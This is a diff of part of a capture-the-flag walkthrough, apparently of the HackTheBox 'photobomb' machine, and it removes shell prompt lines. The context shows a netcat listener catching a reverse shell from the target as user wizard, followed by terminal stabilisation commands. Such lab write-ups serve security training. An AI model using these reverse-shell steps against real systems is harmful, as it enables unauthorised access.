@@ -103,7 +103,6 @@ Here we go there is a delay from the request i made then this shows that this pa
 ## User 
 **Start netcat listener on your machine**
 ```
-┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/photobomb]
 └─$ nc -nlvp 1234                           
 listening on [any] 1234 ...
 ```
@@ -113,7 +112,6 @@ listening on [any] 1234 ...
 
 **Result**
 ```
-┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/photobomb]
 └─$ nc -nlvp 1234                                                                                                  1 ⨯
 listening on [any] 1234 ...
 connect to [10.10.14.160] from (UNKNOWN) [10.10.11.182] 48802
@@ -132,7 +130,6 @@ export TERM=xterm
 wizard@photobomb:~/photobomb$ ^Z
 zsh: suspended  nc -nlvp 1234
 
-┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/photobomb]
 └─$ stty raw -echo; fg
 [1]  + continued  nc -nlvp 1234
 
